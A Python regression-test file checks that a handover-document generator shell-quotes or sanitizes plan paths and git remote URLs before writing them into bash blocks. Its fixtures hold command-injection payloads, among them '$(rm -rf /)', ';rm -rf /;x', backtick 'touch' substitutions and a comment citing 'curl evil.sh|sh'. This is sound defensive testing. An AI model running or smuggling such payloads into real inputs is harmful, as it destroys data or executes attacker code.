"""
Regression tests for 3 HIGH command-injection bugs in HandoverGenerator._render:

  1. plan_override (line 285) — caller-supplied path interpolated raw into
     a fenced ``cat`` bash block.
  2. _repo_name (line 266) — derived from untrusted git remote URL, then
     injected into `cd {_repo_name}` and `cd /tmp/{_repo_name}` blocks.
  3. remote URL (line 282) — `git remote get-url origin` stdout interpolated
     raw into a fenced `git clone --recurse-submodules {...}` block.

Contract under test:
  - Any caller-/git-controlled string rendered into a HANDOVER.md bash code
    block must NOT enable shell injection when a future session copy-pastes
    the block. Specifically, the dangerous payload must be either
    (a) shell-quoted, (b) replaced by a safe placeholder, or
    (c) sanitized to an alphanumeric/._- allowlist.
"""
from __future__ import annotations

import re
from pathlib import Path
from unittest.mock import patch

from harness.handover_generator import HandoverGenerator


def _bash_blocks(content: str) -> list[str]:
    """Return each fenced ```bash ... ``` block from *content* as a string."""
    return re.findall(r"```bash\n(.*?)\n```", content, re.DOTALL)


def _is_inside_single_quotes(line: str, pos: int) -> bool:
    """True if *line*[*pos*] sits inside a single-quoted shell region.

    Walks from the start of *line* to *pos* and counts single quotes.
    An odd count means we are inside a single-quoted string; in shell,
    single-quoted regions preserve all characters literally (no `;`,
    backticks, ``$()``, etc. are interpreted) — so any payload within
    them is safe to copy-paste into a shell.
    """
    return line[:pos].count("'") % 2 == 1


def _assert_safely_quoted_or_placeholder(rendered: str, payload: str) -> None:
    """
    *payload* must not appear in any bash code block in *rendered* in a
    position where shell would interpret it as a command separator.

    The contract enforced by shlex.quote: a shell-unsafe string is wrapped
    in single quotes, so the payload sits inside a single-quoted region
    and is preserved literally by the shell. We verify that property by
    checking that each occurrence of *payload* lies inside a single-quoted
    region (counted per line, since single-quote regions don't span newlines
    in this rendering).
    """
    for block in _bash_blocks(rendered):
        for m in re.finditer(re.escape(payload), block):
            # Look at the specific line containing the payload (single
            # quotes don't span newlines in our renderer).
            line_start = block.rfind("\n", 0, m.start()) + 1
            line_end = block.find("\n", m.end())
            if line_end == -1:
                line_end = len(block)
            line = block[line_start:line_end]
            local_pos = m.start() - line_start
            assert _is_inside_single_quotes(line, local_pos), (
                f"Payload {payload!r} appears outside single quotes in "
                f"bash line: {line!r}"
            )


# ── Bug 1: plan_override → raw f-string into `cat` ──────────────────────────

class TestPlanOverrideShellInjection:
    def test_plan_override_with_semicolon_is_quoted(self, tmp_path: Path):
        """plan_override containing a command separator must be quoted
        in the rendered `cat` block, not interpolated raw."""
        gen = HandoverGenerator(tmp_path)
        # _git_remote / _git_branch / etc. are file-system independent
        # in the test, but they hit the (non-existent) git dir, so they
        # return empty strings under subprocess error. We patch them all
        # to keep the test deterministic.
        with patch.object(gen, "_git_remote", return_value=""), \
             patch.object(gen, "_git_branch", return_value="main"), \
             patch.object(gen, "_state_snapshot", return_value=""):
            gen.write(
                checkpoint_id="P3-pre-gate2-20260504",
                phase=3,
                task_background="bg",
                current_status="status",
                next_steps=["step 1"],
                plan_override="; touch /tmp/PWNED_plan ;",
            )
        content = (tmp_path / "HANDOVER.md").read_text(encoding="utf-8")
        _assert_safely_quoted_or_placeholder(content, "/tmp/PWNED_plan")

    def test_plan_override_with_backtick_is_quoted(self, tmp_path: Path):
        """Backtick command-substitution must be neutralized."""
        gen = HandoverGenerator(tmp_path)
        with patch.object(gen, "_git_remote", return_value=""), \
             patch.object(gen, "_git_branch", return_value="main"), \
             patch.object(gen, "_state_snapshot", return_value=""):
            gen.write(
                checkpoint_id="P3-mid-20260504",
                phase=3,
                task_background="bg",
                current_status="status",
                next_steps=["step 1"],
                plan_override="$(rm -rf /)",
            )
        content = (tmp_path / "HANDOVER.md").read_text(encoding="utf-8")
        _assert_safely_quoted_or_placeholder(content, "$(rm -rf /)")


# ── Bug 2: _repo_name from untrusted remote URL ─────────────────────────────

class TestRepoNameSanitized:
    def test_repo_name_strips_shell_metachars_from_remote(self, tmp_path: Path):
        """A malicious remote URL must be shlex.quote'd in the rendered
        bash block — the _repo_name is allowlist-sanitized separately so
        even if the quoted form were stripped, `cd {name}` and the /tmp/
        path couldn't escape the intended working directory."""
        gen = HandoverGenerator(tmp_path)
        # Remote URL with backticks, ;, and a payload — classic injection.
        malicious_remote = "https://x.com/foo`touch /tmp/PWNED_repo`;x.git"
        with patch.object(gen, "_git_remote", return_value=malicious_remote), \
             patch.object(gen, "_git_branch", return_value="main"), \
             patch.object(gen, "_state_snapshot", return_value=""):
            gen.write(
                checkpoint_id="P3-pre-gate2-20260504",
                phase=3,
                task_background="bg",
                current_status="status",
                next_steps=["step 1"],
            )
        content = (tmp_path / "HANDOVER.md").read_text(encoding="utf-8")
        # Primary contract: the URL payload is rendered inside single
        # quotes (shlex.quote), so backticks and `;` are preserved literally.
        _assert_safely_quoted_or_placeholder(content, "touch /tmp/PWNED_repo")

    def test_repo_name_falls_back_when_remote_is_pure_metachars(
        self, tmp_path: Path,
    ):
        """A remote URL that is pure shell metachars must (a) be quoted
        in the rendered bash block, and (b) the `_repo_name` derived
        from it must remain allowlist-safe (alphanumeric or fallback
        `project`), so `cd {name}` and `/tmp/{name}` cannot enable
        shell execution."""
        gen = HandoverGenerator(tmp_path)
        with patch.object(gen, "_git_remote", return_value=";rm -rf /;x"), \
             patch.object(gen, "_git_branch", return_value="main"), \
             patch.object(gen, "_state_snapshot", return_value=""):
            gen.write(
                checkpoint_id="P3-pre-gate2-20260504",
                phase=3,
                task_background="bg",
                current_status="status",
                next_steps=["step 1"],
            )
        content = (tmp_path / "HANDOVER.md").read_text(encoding="utf-8")
        # (a) the URL is shlex.quote'd
        _assert_safely_quoted_or_placeholder(content, "rm -rf /")
        # (b) every `cd {name}` argument is allowlist-safe
        for block in _bash_blocks(content):
            for m in re.finditer(r"\bcd\s+(?:/tmp/)?(\S+)", block):
                name = m.group(1)
                assert re.fullmatch(r"[A-Za-z0-9._-]+", name), (
                    f"repo name {name!r} contains shell metachars "
                    f"or is not allowlist-safe"
                )


# ── Bug 3: raw remote URL in `git clone` line ───────────────────────────────

class TestRemoteURLShellInjection:
    def test_remote_url_with_semicolon_is_quoted_in_clone(self, tmp_path: Path):
        """The raw remote URL (from `git remote get-url origin`) must not
        be f-string interpolated into the `git clone` line unquoted —
        a malicious URL with `;` would break out of the clone command."""
        gen = HandoverGenerator(tmp_path)
        # A URL where the path component contains shell metachars.
        # Real-world case: a typo-squat repo like `x.com/foo;curl evil.sh|sh;.git`.
        malicious = "https://x.com/foo;touch /tmp/PWNED_clone;x.git"
        with patch.object(gen, "_git_remote", return_value=malicious), \
             patch.object(gen, "_git_branch", return_value="main"), \
             patch.object(gen, "_state_snapshot", return_value=""):
            gen.write(
                checkpoint_id="P3-pre-gate2-20260504",
                phase=3,
                task_background="bg",
                current_status="status",
                next_steps=["step 1"],
            )
        content = (tmp_path / "HANDOVER.md").read_text(encoding="utf-8")
        _assert_safely_quoted_or_placeholder(content, "touch /tmp/PWNED_clone")

    def test_remote_url_with_backticks_is_quoted_in_clone(
        self, tmp_path: Path,
    ):
        """Backtick command-substitution in remote URL must be neutralized."""
        gen = HandoverGenerator(tmp_path)
        malicious = "https://x.com/foo`touch /tmp/PWNED_bt`.git"
        with patch.object(gen, "_git_remote", return_value=malicious), \
             patch.object(gen, "_git_branch", return_value="main"), \
             patch.object(gen, "_state_snapshot", return_value=""):
            gen.write(
                checkpoint_id="P3-pre-gate2-20260504",
                phase=3,
                task_background="bg",
                current_status="status",
                next_steps=["step 1"],
            )
        content = (tmp_path / "HANDOVER.md").read_text(encoding="utf-8")
        _assert_safely_quoted_or_placeholder(content, "touch /tmp/PWNED_bt")
